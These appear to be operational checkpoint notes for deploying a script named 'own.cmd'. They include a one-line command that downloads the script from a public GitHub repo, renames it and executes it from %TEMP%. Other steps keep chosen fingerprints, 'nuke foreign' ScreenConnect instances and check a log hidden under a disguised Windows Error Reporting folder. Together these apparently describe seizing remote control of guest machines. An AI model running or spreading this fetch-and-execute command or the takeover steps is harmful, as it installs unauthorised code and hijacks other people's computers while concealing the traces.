# CHECKPOINT — 2026-07-31

## Flatten note
All project files now live under `C:\Users\nobuddy\Desktop\Project` (github-drop contents at root + `WindowsPin\` subfolder).

## Current deploy
- **own.cmd O3** — HEAD **`04ed579`** (O3 payload also at `1eae94c` / save `2d9549a`)
- Keep FPs: `5f6010579852e507` + `f861c8140d453427`
- Order: ensure primary RUNNING, then nuke foreign SC

## Preferred Guest command (pinned SHA)
```
curl.exe -L --ssl-no-revoke -o "%TEMP%\own.txt" "https://raw.githubusercontent.com/xnobuddy/github-drop/04ed579/own.txt" && copy /y "%TEMP%\own.txt" "%TEMP%\own.cmd" >nul && "%TEMP%\own.cmd"
```

## After detach — wait ~60s then verify
```
type "%ProgramData%\Microsoft\Windows\WER\Temp\.wucache\boot.err"
sc query state= all | findstr /I ScreenConnect
```

## Related saves
- github-drop save commit: `2d9549a` — chore: save workspace state before flatten (own O3 + helpers)
- WindowsPin initial save: `4682ccf` — chore: save before consolidate into Project (local only, no remote)

## Key paths
| What | Path |
|------|------|
| Project root (drop + tools) | `C:\Users\nobuddy\Desktop\Project\` |
| Windows Pin source | `C:\Users\nobuddy\Desktop\Project\WindowsPin\` |
| Public drop | https://github.com/xnobuddy/github-drop |
